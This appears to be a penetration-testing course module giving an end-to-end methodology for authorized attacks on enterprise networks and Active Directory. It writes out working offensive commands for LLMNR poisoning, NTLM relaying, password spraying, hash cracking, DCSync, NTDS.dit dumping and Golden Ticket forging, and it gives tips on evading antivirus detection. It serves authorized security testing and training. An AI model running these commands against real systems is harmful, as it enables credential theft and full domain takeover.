# 35 — Attacking Enterprise Networks

The capstone. End-to-end methodology that chains every previous module. Treat this as the order-of-operations checklist for a black-box external + internal engagement.

```
External  →  Foothold  →  Internal recon  →  AD  →  Privilege  →  Domain Dominance  →  Report
```

## Contents

- [Phase 0 — Pre-engagement](#phase-0-pre-engagement)
- [Phase 1 — External recon (passive → active)](#phase-1-external-recon-passive-active)
- [Phase 2 — Foothold](#phase-2-foothold)
- [Phase 3 — Internal recon (you're inside)](#phase-3-internal-recon-youre-inside)
- [Phase 4 — Active Directory escalation](#phase-4-active-directory-escalation)
- [Phase 5 — Domain dominance](#phase-5-domain-dominance)
- [Phase 6 — Crown-jewel access](#phase-6-crown-jewel-access)
- [Phase 7 — Cleanup](#phase-7-cleanup)
- [Phase 8 — Reporting](#phase-8-reporting)
- [Methodology checklists](#methodology-checklists)
- [What goes wrong (and how to avoid it)](#what-goes-wrong-and-how-to-avoid-it)
- [Sources](#sources)

## Phase 0 — Pre-engagement

Before any packet:

- Scope (IPs, domains, applications, source).
- Out-of-scope (DoS, social engineering, third-party).
- Test windows, point of contact, escalation channel, reporting cadence.
- Authorization letter, signed.
- Logging expectations (do they want detection or no?).

See [01 Penetration Testing Process](01-penetration-testing-process.md).

## Phase 1 — External recon (passive → active)

Goal: map the externally exposed attack surface without touching it (passive), then carefully probe it (active).

### Passive

```bash
DOMAIN=client.tld

# WHOIS / RDAP
whois $DOMAIN

# DNS
dig $DOMAIN ANY
dig $DOMAIN MX
dig $DOMAIN TXT

# Certificate transparency → subdomains
curl -s "https://crt.sh/?q=%25.$DOMAIN&output=json" | jq -r '.[].name_value' | sort -u > subs.txt
subfinder -d $DOMAIN -all -recursive >> subs.txt
amass enum -passive -d $DOMAIN -silent >> subs.txt
sort -u subs.txt -o subs.txt

# Search & paste / leak surface
trufflehog github --org=<org>
theHarvester -d $DOMAIN -b all
```

See [12 Information Gathering – Web Edition](12-information-gathering-web.md).

### Active

```bash
# Resolve the subs
puredns resolve subs.txt -r resolvers.txt -w live-dns.txt

# HTTP probe
httpx -l live-dns.txt -title -tech-detect -status-code -follow-redirects -o live-http.txt

# Port sweep on the unique IPs
sort -u live-dns.txt | awk '{print $NF}' | sort -u > ips.txt
sudo nmap -p- --min-rate 5000 -iL ips.txt -oA stage1
nmap -sCV -p<open-ports> -iL ips.txt -oA stage2
sudo nmap -sU --top-ports 100 -iL ips.txt -oA udp
```

See [10 Nmap](10-network-enumeration-with-nmap.md), [11 Footprinting](11-footprinting.md).

### Output of Phase 1

- A list of live hosts and exposed services.
- A list of web applications + technology fingerprints.
- A list of email addresses / usernames + format guesses.
- An attack-surface map ready for triage.

## Phase 2 — Foothold

Goal: any code execution on a system in scope. Or any valid credential.

### External web → foothold

For each web app:

1. Crawl + content discovery. ([22 FFuF](22-attacking-web-apps-with-ffuf.md))
2. Fingerprint the stack. ([08 Web Apps Intro](08-introduction-to-web-applications.md))
3. Run product-specific paths if it's a known app. ([31 Common Apps](31-attacking-common-applications.md))
4. Probe parameters and forms with a proxy. ([21 Web Proxies](21-using-web-proxies.md))
5. Look for: SQLi, XSS, file upload, file inclusion, command injection, SSRF, IDOR, deserialization, SSTI. ([24-30](30-web-attacks.md))
6. Authenticate (default creds, leaked creds, password spray) if blocked at the door. ([23 Login Brute Forcing](23-login-brute-forcing.md))

### External services → foothold

- Default credentials on management panels (Tomcat, Jenkins, Splunk, GitLab, vCenter, etc.).
- Known CVEs against version-leaking services (vsftpd, ProFTPD, Exim, Confluence, Exchange).
- Password spray against authenticated front-ends (OWA, RDP, SSH).
- Look for VPN portals — captured creds get you past the perimeter cheaply.

### Phishing (when in scope)

Send a credential-harvesting page hosted on a look-alike domain. See [Module 18 SMTP](18-attacking-common-services.md) for delivery primitives. Out of scope for many CPTS-style engagements — confirm before using.

## Phase 3 — Internal recon (you're inside)

You're sitting on either an internal IP or a foothold host. New questions:

- What subnet am I on? What can I see?
- Is there an Active Directory? Which DC?
- What other interesting subnets exist?

```bash
# Linux foothold
ip a; ip r
ss -tlnp; netstat -tulnp 2>/dev/null
cat /etc/resolv.conf
arp -an

# Sweep the local /24
nmap -sn 10.10.10.0/24
```

```powershell
# Windows foothold
ipconfig /all
route print
arp -a
Get-NetTCPConnection -State Listen
nltest /dclist:<domain>
nltest /dsgetdc:<domain>
```

### Identify the AD environment

```bash
# DC discovery via DNS SRV
dig SRV _ldap._tcp.dc._msdcs.<DOMAIN> @<DC>
dig SRV _kerberos._tcp.<DOMAIN> @<DC>
```

If you have any cred at this point: BloodHound from a Linux foothold.

```bash
bloodhound-python -d <DOMAIN> -u <USER> -p <PASS> -c All -ns <DC> --zip
```

See [07 Intro AD](07-introduction-to-active-directory.md), [20 AD Attacks](20-active-directory-attacks.md).

### Pivoting to deeper subnets

If the foothold is dual-homed or routes you to other internal ranges:

- SSH / sshuttle (Linux foothold)
- Chisel (HTTP egress only)
- Ligolo-ng (cleanest, full TUN)
- Metasploit autoroute + `socks_proxy`
- `netsh portproxy` (Windows)

See [19 Pivoting](19-pivoting-tunneling-port-forwarding.md).

## Phase 4 — Active Directory escalation

This is where most internal engagements live.

### From zero credentials inside

```bash
# Coerce LLMNR / NBT-NS broadcasts and capture NetNTLMv2
sudo responder -I tun0 -wd
hashcat -m 5600 hashes rockyou -r best64.rule

# Or relay (signing not enforced)
impacket-ntlmrelayx -tf relay-targets.txt -smb2support -socks
```

```bash
# Username enumeration (no lockout)
kerbrute userenum -d <DOMAIN> --dc <DC> users.txt

# Spray a guessable password
kerbrute passwordspray -d <DOMAIN> --dc <DC> users.txt 'Spring2025!'
```

### From one valid credential

```bash
USER=alice; PASS='Spring2025!'; DC=10.10.10.5; D=corp.local

netexec smb $DC -u $USER -p $PASS --pass-pol     # confirm + read pol
netexec smb $DC -u $USER -p $PASS --shares
bloodhound-python -d $D -u $USER -p $PASS -c All -ns $DC --zip
```

Look for in BloodHound:

- "Find Shortest Paths to Domain Admins"
- Kerberoastable accounts
- AS-REP-roastable accounts
- Outbound object control
- Unconstrained delegation
- ADCS misconfiguration findings

### Escalation mechanisms (pick the cleanest)

| Finding | Path |
|---|---|
| Kerberoast → cracked service password | Likely admin somewhere |
| AS-REP roast → cracked password | Same |
| ACL: GenericAll on user | ForceChangePassword / Shadow Credentials |
| ACL: GenericAll on computer | RBCD or Shadow Credentials |
| Unconstrained delegation host | PrinterBug → DC TGT → DCSync |
| ADCS ESC1/ESC8 | Cert as DA |
| Local admin reuse | NetExec sweep, find a box where dumped LSA gives DA cred |

See [20 AD Attacks](20-active-directory-attacks.md) for the syntax of each.

### Local privesc on a member server

If a Domain User is local admin (or you reach a service account on the host):

- Linux: linpeas, GTFOBins, kernel/CVE-specific ([32 Linux Privesc](32-linux-privilege-escalation.md))
- Windows: winPEAS, Potato family, AlwaysInstallElevated, etc. ([33 Windows Privesc](33-windows-privilege-escalation.md))

After `SYSTEM`:

```bash
impacket-secretsdump -sam SAM -system SYSTEM -security SECURITY LOCAL  # local hashes
# Look for cached domain creds (DCC2 — slow to crack but high-value)
```

## Phase 5 — Domain dominance

The goal varies — usually "demonstrate Domain Admin or equivalent" and "reach the customer's defined crown jewel".

```bash
# DCSync (any user with DS-Replication-Get-Changes-All on the domain)
impacket-secretsdump -just-dc-ntlm $D/Administrator:Pass1@$DC

# Read NTDS.dit on a DC if you have shell there
robocopy /B C:\Windows\NTDS C:\Temp NTDS.dit
robocopy /B C:\Windows\System32\config C:\Temp SYSTEM
impacket-secretsdump -ntds NTDS.dit -system SYSTEM LOCAL

# Forge tickets (only if scope authorises persistence demonstration)
impacket-ticketer -nthash <KRBTGT> -domain-sid <S-1-5-21-...> -domain $D \
  -groups 512,513,518,519,520 Administrator
```

Cross-domain / cross-forest:

- Inter-realm `krbtgt` keys live on each DC; Golden Ticket is per-domain.
- Forest-trust hops use SID history attacks (when SIDFiltering is disabled).

See [20 AD Attacks](20-active-directory-attacks.md) for trust-attack syntax.

## Phase 6 — Crown-jewel access

Once you have domain dominance, demonstrate the customer's specific business risk:

- Read the CFO's mailbox (Exchange admin role / OWA via DCSync hash).
- Access the database holding regulated PII.
- Read the source code repository.
- Touch the OT / payment / payroll system.

The point isn't access for its own sake — it's a business-language sentence in the executive summary.

## Phase 7 — Cleanup

Before signing off:

- Remove uploaded binaries / scripts.
- Remove created accounts (`net user evil /delete`, AD object cleanup if you used `addcomputer`).
- Restore changed configs (`sc config <svc> binpath= "<original>"`).
- Document everything you did NOT clean up (so the customer can finish the cleanup themselves).
- Logs — never delete, even when scope allows it. Note your IP and timestamps so the blue team can verify.

## Phase 8 — Reporting

See [34 Documentation & Reporting](34-documentation-and-reporting.md).

Two artifacts:

1. **Findings** — per-issue, with CVSS, evidence, remediation.
2. **Attack narrative** — chronological, links findings into the chain. The deliverable that gets read.

## Methodology checklists

### External

- [ ] Subdomains (passive + active)
- [ ] Live HTTP enumerated, fingerprinted
- [ ] Full TCP sweep on every in-scope IP
- [ ] Default creds tested on every admin panel
- [ ] Known-CVE check on every fingerprinted service
- [ ] Email harvesting + username format derived
- [ ] Web apps tested per OWASP WSTG
- [ ] VPN / RDP / OWA password sprayed (lock-out aware)

### Internal

- [ ] Network ranges enumerated
- [ ] DC(s) identified, domain name confirmed
- [ ] LLMNR/NBT-NS poisoning attempted
- [ ] Kerberos user enum + spray
- [ ] BloodHound run from at least one credential
- [ ] Kerberoast + AS-REP roast extracted
- [ ] ACL paths reviewed in BloodHound
- [ ] Coercion attempted (PetitPotam / PrinterBug / DFSCoerce)
- [ ] ADCS templates checked (`certipy find`)
- [ ] Local-admin reuse swept
- [ ] Pivoting to internal-only ranges
- [ ] Member-server privesc paths reviewed

### AD escalation

- [ ] At least one user → privileged path identified
- [ ] DA / EA reach demonstrated and documented
- [ ] DCSync executed (with authorization)
- [ ] krbtgt obtained for Golden Ticket demonstration (with authorization)
- [ ] Trust paths examined

### Reporting

- [ ] Each finding has CVSS vector + evidence + remediation
- [ ] Attack narrative chains the findings
- [ ] Executive summary explains business impact in plain English
- [ ] Re-test plan agreed with the customer

## What goes wrong (and how to avoid it)

- **Scope drift** — keep `scope.txt` open, re-check before every new target. Add to it only via written approval.
- **Lockout incidents** — always read pwd policy first, throttle sprays.
- **Detection by chance** — Defender alerting on a tool name. Rename binaries, encode payloads, use less-known equivalents.
- **Lost evidence** — log to disk, screenshot in real-time, don't rely on terminal scrollback.
- **Customer panic** — over-communicate when you reach DA / DCSync / dump NTDS. Give the SOC a heads-up.
- **Engagement creep** — fixed-cost engagements end on the deadline. Box and ship findings rather than chasing one extra path.

## Sources

- PTES: http://www.pentest-standard.org/
- OWASP WSTG: https://owasp.org/www-project-web-security-testing-guide/
- MITRE ATT&CK: https://attack.mitre.org/
- The Hacker Recipes: https://www.thehacker.recipes/
- HackTricks: https://book.hacktricks.wiki/
- ADSecurity: https://adsecurity.org/
- The rest: every preceding module's source list.
